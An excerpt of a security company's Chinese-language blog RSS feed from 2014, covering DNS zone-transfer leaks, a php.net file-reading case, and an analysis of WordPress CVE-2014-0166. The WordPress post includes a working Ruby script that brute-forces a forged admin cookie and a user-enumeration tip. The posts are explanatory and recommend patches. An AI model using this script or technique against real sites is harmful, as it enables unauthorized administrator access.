&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏網域名稱&lt;/p&gt;

    &lt;p&gt;一般企業在進行&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;時，通常只會挑幾個最重要、最常面對客戶的網域進行測試，但是入侵者可不會這麼乖。當有人嘗試要入侵企業時，必定是先進行全面的偵查，觀察企業哪幾個網域所執行的 service 有潛在的弱點，或是看哪幾個網域防禦力道較弱，再從該處下手。因此 zone transfer 問題所提供的完整 DNS 記錄，就為入侵者省下了許多偵查的工夫。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏外網 IP 範圍&lt;/p&gt;

    &lt;p&gt;當攻擊者取得 zone transfer 所洩漏的資料後，可合理推斷哪些網段是屬於該企業，進一步對該網段進行掃描，嘗試找尋有機會入侵之標的物。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏內網 IP 範圍&lt;/p&gt;

    &lt;p&gt;有些管理人員、開發者為求內部開發方便，經常會將網域名稱跟內網 IP 位址綁在一起，例如將 phpmyadmin.example.com 設定為 192.168.1.100，攻擊者就可根據此類資訊猜測內網哪些網段存在重要服務。這種設定平常也許不會造成重大損害，但是當管理者疏於建立內網防禦機制，恰好企業又被入侵至內網時，造成一連串重大損失的機率將會大幅提高。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;解決方式&quot;&gt;解決方式&lt;/h3&gt;

&lt;h4 id=&quot;linux-1&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;若使用 Linux，可在 /etc/named.conf 內加入下列選項，以限制可存取 zone transfer 的來源：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;options &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    allow-transfer &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        1.2.3.4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        5.6.7.8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;設定完畢後，將 DNS 服務重啟即可生效。&lt;/p&gt;

&lt;h4 id=&quot;windows-1&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;在 Windows server 當中，我們可到伺服器管理員修改網域的相關設定，如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; alt=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在伺服器管理員中，選定想要修改的網域（此處以 test.com 為例），按右鍵點選內容，將會跳出選單如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; alt=&quot;修改 test.com 的 zone transfer 設定&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接著就是觀看「允許區域轉送」選項是否有勾選，若已勾選，則確認轉送對象是否為下列兩種：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;只到列在「名稱伺服器索」引標簽上的伺服器&lt;/li&gt;
  &lt;li&gt;只到下列伺服器&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;tcp-53-port&quot;&gt;TCP 53 port&lt;/h4&gt;

&lt;p&gt;DNS 在做 zone transfer 時是使用 TCP 53 port（有別於一般 DNS query 的 UDP 53 port），因此有些人會認為將 TCP 53 port 關閉就可以對付 zone transfer，而不想修改 zone transfer 的設定。其實這個觀念只對了一半，若 zone file 的資料小於 512 byte，仍然可以透過 UDP 傳輸。即使 zone file 的資料大於 512 byte，&lt;a href=&quot;http://securityweekly.com/2011/11/incremental-zone-transfers-for.html&quot;&gt;也可以用 Incremental Zone Transfer (IXFR) 的方式取得部分資料&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;如果企業今天非常有自信能夠替所有網域都準備好完善的安全措施，那麼 zone transfer 所洩漏的資料對該企業就不會有太嚴重的影響。然而，在現今這個入侵手法日新月異的世界裡，又有誰能夠永遠保證自己的安全防護已經做足了呢？在前陣子火紅的 &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed&lt;/a&gt; 問題被爆出來之後，我們就藉由許多 zone transfer 的記錄觀察到全世界有非常多企業只修復了主要網站的 OpenSSL 漏洞，卻忽略了企業內其他的服務與設備可能也有此漏洞，像是 DB、Email、VPN、NAS 等等，直到今日仍遲遲未修復。&lt;/p&gt;

&lt;p&gt;千萬別以為你所購買的各種資安設備能防禦所有資安弱點，也別忽略了各項古老的資安弱點，更別小看了你所不熟悉的駭客們的組合各式各樣弱點的能力，只要有一個資安環節疏漏，隨時都有可能對企業造成致命危機。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/</link>
                <guid>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue</guid>
                <pubDate>Mon, 05 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>PHP 官網原始碼讀取案例</title>
                <description>&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;不安全的引用物件 (Insecure Direct Object Reference)&lt;/a&gt; 是個非常常見的資安漏洞，在 &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; 公布的&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;十大網站應用程式安全漏洞&lt;/a&gt; 中高居第四名。通常發生在網站應用程式上沒有針對輸入的參數做好檢查，就把參數丟入 include 或 readfile 等函數當中引用，使得攻擊者可以藉此存取任意文件的原始碼。&lt;/p&gt;

&lt;p&gt;今天這個案例就發生在 PHP 的官方網站 (&lt;a href=&quot;http://www.php.net/&quot;&gt;http://www.php.net/&lt;/a&gt;)，消息來源是知名的 0-Day 黑市 1337day，發佈的日期是 2014/4/4 ，原始的內容是這樣的：&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot; alt=&quot;1337day 漏洞交易網站&quot; title=&quot;1337day 漏洞交易網站&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;可以看到這個弱點是不公開的，想要知道內容的話要支付 82 美元相當於新台幣 3500 元呢！在強烈的好奇心屈使之下，自己打開工具來找看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot; alt=&quot;PHP 官方網站原始碼&quot; title=&quot;PHP 官方網站原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;透過簡單的分析和一點點運氣，找到了 「&lt;a href=&quot;http://www.php.net/cached.php&quot;&gt;http://www.php.net/cached.php&lt;/a&gt;」 這隻程式，發現它傳入了「t」和「f」這兩個參數。「t」直覺上就是個 rand 數值，而「f」應該就是檔案位置了。這時候對 f 參數小小修改一下，神奇的事情發生了：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot; alt=&quot;cached.php 讀取原始碼&quot; title=&quot;cached.php 讀取原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;index.php 的原始碼被完整的讀出來，當然也要來看一下 cached.php 是怎麼寫的：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot; alt=&quot;cached.php 檢視原始碼&quot; title=&quot;cached.php 檢視原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;可以看到此處並未對 $_GET[“f”] 進行檢查，所以修改了 $_GET[“f”] 後，與 $abs 組合完，最後就直接丟入 readfile 讀取檔案。比較值得研究的是這邊使用了 realpath 與 strncmp 來比較 f 及 DOCUMENT_ROOT，確保 $abs 只能在網站目錄之下，所以無法使用 ../../ (&lt;a href=&quot;https://www.owasp.org/index.php/Path_Traversal&quot;&gt;Path Traversal&lt;/a&gt;) 的方式跳脫目錄進行更進一步的滲透。&lt;/p&gt;

&lt;p&gt;最後我們將此發現回報給 security@php.net ，得到的回應是他們是「故意的 (intentional)」。且後來也知道 PHP 官網是開放原始碼（Open Source）的，可以到 &lt;a href=&quot;http://git.php.net/?p=web/php.git;a=tree&quot;&gt;http://git.php.net/?p=web/php.git;a=tree&lt;/a&gt; 下載整個官網的原始碼。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot; alt=&quot;PHP.NET 官網團隊回應&quot; title=&quot;PHP.NET 官網團隊回應&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;雖然在這個案例中並沒有造成實質上的危害，沒有帳號、密碼、系統設定等機敏資料，但若把此種寫法用在其他地方，則可能造成很大的資安風險。就連 PHP 官方網站都有這樣的失誤，身為開發人員的你們更不可不慎！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference/</link>
                <guid>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference</guid>
                <pubDate>Thu, 24 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>CVE-2014-0166 WordPress 偽造 Cookie 弱點</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;在一陣 OpenSSL Heartbleed 淘金潮中，又有一個技術門檻低、後果嚴重、也同樣需要些運氣的漏洞被揭發－&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166&quot;&gt;CVE-2014-0166&lt;/a&gt;。CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。
讓我們來分析一下這次的弱點是發生了什麼事吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;解析&quot;&gt;解析&lt;/h3&gt;

&lt;p&gt;這次出問題的程式碼在&lt;a href=&quot;https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650&quot;&gt;這邊&lt;/a&gt;，關鍵程式碼如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wp_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass_frag&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;|&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$scheme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash_hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;md5&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;|&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hmac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;cd&quot;&gt;/**
   * Fires if a bad authentication cookie hash is encountered.
   *
   * @since 2.7.0
   *
   * @param array $cookie_elements An array of data for the authentication cookie.
   */&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;auth_cookie_bad_hash&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;問題主要發生在比較運算子 != 上面，!= 運算子是 non-strict，會在比較前先做型態轉換，所以下面看似應該是回傳 true 的例子，全部都顯示為 false，細節請參閱&lt;a href=&quot;http://www.php.net/manual/en/language.operators.comparison.php&quot;&gt;官方手冊&lt;/a&gt;。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1 != 1 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1e1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 10 != 10 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1e2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 100 != 100 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0e10123456789012345678901234567890&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;進入正題，WordPress 認證身分用的 cookie 內容是這樣的：『username|expiration|hmac』。&lt;br /&gt;
username 是使用者名稱，&lt;br /&gt;
expiration 是有效期限(timestamp)，&lt;br /&gt;
hmac 值用來驗證 cookie 是否合法。&lt;br /&gt;
從上面程式碼可以看到，hmac 的算法是經過 username、pass_frag、expiration、key 綜合得出。若有辦法控制 cookie 中的 hmac 使伺服器認為該 cookie 合法，就可以成功偽造成 username。&lt;/p&gt;

&lt;p&gt;利用稍早提到的比較運算子問題，若我們讓 cookie 中的 hmac 值為 0，很有可能讓判斷式變成下面這樣：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//if ( $hmac != $hash ) {&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0e10123456789012345678901234567890&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;auth_cookie_bad_hash&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;如此便可以通過驗證，成功偽造合法 cookie。&lt;br /&gt;
而為了讓 $hash == 0，可以不斷改變 cookie 中的 expiration，讓產生的 MD5 值($hash)經過型態轉換後剛好變成 0。&lt;br /&gt;
符合 $hash == 0 的 MD5 $hash 值有 
0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX、00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXX….000000000000000000000000000eX、00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)&lt;/p&gt;

&lt;p&gt;故出現 $hash == 0 的機率為 Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09&lt;/p&gt;

&lt;p&gt;每次偽造的成功機率約為三億分之一，並不會很高，但已經足夠在一個月內拿到最高權限，而且所耗成本並不會很高。&lt;/p&gt;

&lt;h3 id=&quot;實驗&quot;&gt;實驗&lt;/h3&gt;

&lt;p&gt;為了驗證此方法之可行性，我們架設了 &lt;a href=&quot;http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip&quot;&gt;WordPress 3.8.1&lt;/a&gt; 環境。並且寫程式將登入 cookie 中的 hmac 設為 0，不斷調整 expiration 值測試是否已經登入，程式如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;httpclient&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HTTPClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://domain.my/WordPress/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Cookie&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;logout&apos;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：此程式為 POC，請自行調整為多執行緒版本，不然速度會很慢。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;經過一段長時間的等待，得到的結果如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/iTerm.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/iTerm.png&quot; alt=&quot;暴力偽造 cookie，直到成功登入&quot; title=&quot;暴力偽造 cookie，直到成功登入&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;得知當 cookie 中的 username 為 admin 且 expiration 值為 1421818232 時，伺服器算出來的 hmac 經過型態轉換會變成 0。我們將測試成功的 cookie 值： admin%7C1421818232%7C0 貼到瀏覽器上。成功變成 admin 如下圖，實驗成功！&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/Mantra1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/Mantra1.png&quot; alt=&quot;利用偽造的 cookie 登入 WordPress&quot; title=&quot;利用偽造的 cookie 登入 WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：一般狀況，若不知道 WordPress 最高權限的帳號，可以利用 WordPress 的 feature 在 http://your.WordPress.com/?author=$id ($id: 1,2,3,4…,999,…) 頁面中列舉所有使用者帳號。通常 $id = 1 的 author 都有 WordPress 的管理權限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;最近出現了一個高風險通報 CVE-2014-0166，其中提及 WordPress 在舊版驗證 cookie 的部分出現弱點，可以偽造合法 cookie，進而取得 WordPress 管理權限。本文分析了其原理，並且證實之。&lt;/p&gt;

&lt;p&gt;對於攻擊者而言，雖然每次偽造 cookie 成功的機率約為三億分之一並不高，但發送三億個 request 後或許能拿到最高權限，已經是值得投資的級數。&lt;/p&gt;

&lt;p&gt;對於 WordPress 管理者而言，建議立即更新至 3.8.2 以後版本，以免受到此風險攻擊。&lt;/p&gt;

&lt;p&gt;從此事件也提醒了 PHP 開發者，在撰寫重要的驗證行為，要特別注意 PHP 比較運算子的特性，請使用 === (不等於請用 !==)來保證等式左右型態與值為一樣，避免因為轉型造成的資安風險。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/</link>
                <guid>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</guid>
                <pubDate>Wed, 16 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL Heartbleed 全球駭客的殺戮祭典，你參與了嗎？</title>
